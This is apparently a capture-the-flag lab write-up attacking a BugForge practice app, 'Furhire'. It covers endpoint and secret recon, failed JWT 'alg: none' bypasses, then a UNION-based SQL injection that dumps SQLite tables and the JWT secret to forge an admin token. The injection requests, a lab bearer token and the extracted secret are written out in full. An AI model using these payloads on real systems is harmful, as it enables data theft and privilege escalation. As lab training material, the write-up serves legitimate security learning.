
Testing the Furhire application I took a different approach today and started on recon before attempting to attack it, see if I could find any hidden information.

I decided to first check for any forgotten API secrets, so for that I will use the method  
[**Katana**](https://github.com/projectdiscovery/katana) +  [**Mantra**](https://github.com/brosck/mantra)
# Searching for Secrets
Katana will crawl a website and get all visible urls then we will use mantra to download the pages and perform some ReGex search for api,secrets, tokens etc..
We will perform an authenticated scan using Katana, which is why we are also parsing the token with the -H
## 1. Crawling Website
```bash
 token='Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJib3NzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjgxNzYxMDJ9.qBbRYw9p0aJs-6PB-2sPBBj-rvo4Wlt5920hZJjN0vY'
 target='https://lab-1768176060864-1bb6hh.labs-app.bugforge.io/'
 
 katana -u $target -H $token -jsl |tee katana_out.txt
```
|Flag| Description|
|------|------------|
|-jsl |more indepth scan|
|-H | request headers|
![[Pasted image 20260112001959.png]]
## 2. Checking for secrets
We will use [mantra](https://github.com/brosck/mantra) now to download the pages and perform a scan for api secrets and passwords, all these is done in memory so no files are created. Unfortunatelly ther were no secrets found this time so we move on.
```bash
cat katana_out.txt | mantra
```
![[Pasted image 20260112002347.png]]

---


# Finding Hidden Api Routes
The next step I took was look for any hidden paths on the application that the developer might have left it hidden to avoid un-authorized access.
I have used [KiteRunner](https://github.com/assetnote/kiterunner) to help brute force the api routes.
> Important to notice that I have used an authenticated scan, with the option **-H** we can pass the headers with our bearer token

## Scanning using KiteRunner
```bash
 token='Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJib3NzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjgxNzYxMDJ9.qBbRYw9p0aJs-6PB-2sPBBj-rvo4Wlt5920hZJjN0vY'
 target='https://lab-1768176060864-1bb6hh.labs-app.bugforge.io/'

kr scan $target  -w medium-admin-api-routes.kite -H $token -x 20  --wildcard-detection=false --fail-status-codes 404

```
> Obs: Here I use a custom admin list, which is a normal wordlist.txt but we have to convert to .kite using the below
> `kr kb convert wordlist.txt wordlist.kite`


| Flags                      | Description                                                        |
| -------------------------- | ------------------------------------------------------------------ |
| -H                         | Pass the bearer token with this flag                               |
| --fail-status-codes        | Filter out errors 404 if needed separate multiple with 404,401,400 |
| --wildcard-detection-false | Turns off wildcard, this option is essential                       |
| -x                         | Max connections to host                                            |

![[Pasted image 20260111220417.png]]

After discovering the **/admin** endpoint I went to the page on the browser to check it out, unfortunately the page was locked.
![[Pasted image 20260111221901.png]]
I went straight to the Web Dev Tools to verify if there was something I could do there so I modify the user role to "admin" and tried reloading the page again
![[Pasted image 20260111222030.png]]
That did not work, so I tried updating the role on the JWT itself.
On the page there was a warning saying "This page is restricted to **administrators**" so I set my role to "administrators", but that didn't work LOL!
![[Pasted image 20260111222921.png]]
I then decided to look into the source code of the page and notice the role it was looking for its called "admin", then I remember that I didn't have the secret for the token I would have to try some JWT bypass.
![[Pasted image 20260111222217.png]]
I have tried the common attacks:
- "alg": "None"
- "alg": "none"
- "alg": "NoNe"
- Removing the "alg" completely
- Removing the signature from the JWT
Unfortunately nothing worked

---

# Modifying the Request  at RunTime

Upon inspecting the app in more detail I notice if the response.ok == true we could reveal the **data.flag** . I then tried to set up some break points within the application and try to modify the **response.ok = true** before the app could finish loading attempting to read the flag during runTime

## Setting breakpoint on app ![[Pasted image 20260111223324.png]]
On the Console tab of the WebDev tools I attempted to modify the response.ok, but it 
proven to be more difficult, so I had to get a specifc command to get it working.
![[Pasted image 20260111223829.png]]
```javascript
Object.defineProperty(response, 'ok', {
  get: () => true,
  configurable: true
});
```
Unfortunately again, I have noticed a bit too late but the **request already returned 403** so there was no data to be displayed. This is a typical case of "Security by Front-End" but its not the case of our lab here. Back to the drawing board. #discord 
![[Pasted image 20260111224126.png]]

# Trying a different angle
I knew I was on the right path, but I was still missing one thing to get the request to the Back-End, I need that JWT secret. At this point I had to use the hint, and it reveals to be a **Blind SQL Inject** so I knew where to go from here.


### 1. Finding an SQL Entry Point
I noticed there was an enpdoint that could be a good target to test for SQL injection below are the tests done.

```bash
/jobs/3
```
The application retrieves job details via the API:
```
GET /api/jobs/3
```
Response returns valid job data.

---
### 2. Identifying SQL Injection
Testing with a quote:
```
GET /api/jobs/3'
```
Response:
```javascript
{"error":"Job not found"}
```
Testing SQL syntax without quotes:
```
GET /api/jobs/3%20order%20by%201--
```
Valid response returned, confirming SQL injection.

---
### 3. Determining Column Count
```
GET /api/jobs/3%20order%20by%2016--
```
No error
```
GET /api/jobs/3%20order%20by%2017--
```
Error returned
Column count is **16**

---
## UNION-Based SQL Injection

### 4. Database Version
```
GET /api/jobs/3%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,sqlite_version()--
```
Response confirms **SQLite 3.44.2**

---
### 5. Enumerating Tables
```
GET
/api/jobs/3%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(DISTINCT tbl_name) FROM sqlite_master
```
##### Response:
```
[..retracted..]
"application_count":"users,sqlite_sequence,user_profiles,companies,jobs,applications,saved_jobs,notifications,config",
```
---
### 6. Inspecting Config Table
```
GET /api/jobs/3%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(name, ', ') FROM pragma_table_info('config')--
```
##### Response:
```
[..retracted..]
"application_count":"id, key, value, created_at",
```
---
### 7. Extracting JWT Secret
```
GET /api/jobs/3%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,key||':'||value FROM config--
```
##### Response:
```
[..retracted..]
"application_count":"phonesCheeseTiramisu1199"
```
> JWT Secret retrieve, shout out to [ruur](https://ruur.gitbook.io/) Your write up was helpful

---
# Signing the JWT
Now that we have the JWT Secret, we can forge our own JWT token an attempt to load the **/admin** page again.

So I went to Burp and from the Repeater section, using the JWT Editor Extension I created a new Signing Key
![[Pasted image 20260111235711.png]]

Once the Signing Key is created, we can modify our token to have admin role again and sign the token.
![[Pasted image 20260112000036.png]]

With the new token we can update our token again on the Web Browser Local Storage and try loading the page again
![[Pasted image 20260112001110.png]]
#Pwned